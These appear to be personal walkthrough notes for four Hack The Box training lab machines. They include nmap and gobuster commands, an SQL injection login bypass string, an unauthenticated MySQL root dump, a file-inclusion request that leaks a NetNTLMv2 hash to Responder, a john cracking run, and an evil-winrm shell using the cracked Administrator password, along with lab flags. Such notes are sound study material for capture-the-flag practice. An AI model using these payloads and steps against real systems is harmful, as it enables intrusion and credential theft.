# TIER 1 STARTING POINT BOXES

--------------------------------------------------------------------

**TOOLS USED**: nmap, gobuster, responder, john, evil-winrm

**nmap**: network exploration tool and security / port scanner<br>

```
nmap [Scan Type...] [Options] {target specification}
```

Scan Types:<br>
-Ss [DEFAULT] TCP SYN Scan (Doesn't open full TCP connection)<br>
-St TCP Scan (Opens full TCP connection)<br>
-Su UDP Scan<br>

**gobuster**: tool to brute force URIs (dirs, files, dns subdomains)

```
gobuster [command]
```

**responder**: LLMNR, NBT-NS and MDNS poisoner used to gather information from a network

```
responder [options]
```

-I specify network interface


**john**: tool to crack weak passwords

```
john [options] password-files
```

**evil-winrm**: windows remote management shell

```
evil-winrm -i IP -u USER [-s SCRIPTS_PATH] [-e EXES_PATH] [-P PORT] [-p PASS] [-H HASH] [-U URL] [-S] [-c PUBLIC_KEY_PATH ] [-k PRIVATE_KEY_PATH ] [-r REALM] [--spn SPN_PREFIX] [-l]
```

--------------------------------------------------------------------

## APPOINTMENT BOX

**TOOLS USED**: nmap, gobuster

**IP Address**: 10.129.182.2

```
nmap -sC -sV -p- -oN appointment_nmap.txt 10.129.182.2
```

**EXPOSED PORT (SERVICE)**: 80 (http)

```
gobuster dir -u 10.129.182.2 -w /usr/share/dirb/wordlists/common.txt
```

10.129.182.2/js has a js file which shows we can do SQL injection

SQL Validation Query: SELECT * FROM users WHERE name=' ' and password=' '

user: ' or '1'='1 <br>
password: ' or '1'='1 <br>

FLAG: e3d0796d002a446c0e622226f42e9672

--------------------------------------------------------------------

## SEQUEL BOX

**TOOLS USED**: nmap

**IP Address**: 10.129.49.167

```
nmap -sV -sC -T2 -oN sequel_nmap.txt 10.129.49.167
```

**EXPOSED PORT (SERVICE)**: 3306 (mysql)

```
mysql -h 10.129.49.167 -u root
```

```
show databases;
use htb;
show tables;
select * from config, users;
```

FLAG: 7b4bec00d1a39e3dd4e021ec3d915da8

--------------------------------------------------------------------

## CROCODILE BOX

**TOOLS USED**: nmap, gobuster

**IP Address**: 10.129.54.45

```
nmap -sV -sC -T2 -oN crocodile_nmap.txt 10.129.54.45
```

**EXPOSED PORT (SERVICE)**: 21 (ftp), 80 (http)

Anonymous FTP login allowed (FTP code 230)<br>
user:anonymous

```
get allowed.userlist
get allowed.userlist.passw
```

user of interest from allowed.userlist: admin

run wappalyzer browser extension to find website is using php

```
gobuster dir -u http://10.129.54.45 -w /usr/share/dirb/wordlists/common.txt  -x php,html
```

-x: specifies what file types to search for

hidden dir: /login.php

user: admin<br>
password: rKXM59ESxesUFHAd<br>
manually brute forced login

FLAG: c7110277ac44d78b6a9fff2232434d16

--------------------------------------------------------------------

## RESPONDER BOX

**TOOLS USED**: nmap, responder, john, evil-winrm

**IP Address**: 10.129.55.209

```
nmap -sV -sC -oN responder_nmap.txt 10.129.55.209
```

**EXPOSED PORT (SERVICE)**:<bvr>
80 (http),<br>
5985 (http)<br>

Port 5985 is WRM (Windows Remote Management) over http

Add "10.129.55.209 unika.htb" to /etc/hosts file because 10.129.97.135 redirects to unika.htb

```
sudo responder -I tun0
```

Need to disable firewall and NextDNS

Get hash by requesting this share in the web server:<br>
http://unika.htb/index.php?page=//10.10.14.199/share

responder picked up this hash (NetNTLMv2):  Administrator::RESPONDER:c00342e4f7c6ff50:351C1FB240F1D416F99946FF220ABE26:01010000000000000051D4C7759FD801A798C22477D4964800000000020008004C0041004600510001001E00570049004E002D004D004F00460056005600550034005100430033004B0004003400570049004E002D004D004F00460056005600550034005100430033004B002E004C004100460051002E004C004F00430041004C00030014004C004100460051002E004C004F00430041004C00050014004C004100460051002E004C004F00430041004C00070008000051D4C7759FD80106000400020000000800300030000000000000000100000000200000C03FF16D769873A9F981408EBF563AFFD3F174D8B80FABCAD07AA42C1DB4F51A0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003100390039000000000000000000

```
 john --wordlist=~/wordlists/rockyou.txt hash.txt
 ```

USER: Administrator<br>
PASSWORD: badminton<br>

```
 evil-winrm -i 10.129.55.209 -u administrator -p badminton
 ```

FLAG: ea81b7afddd03efaa0945333ed147fac
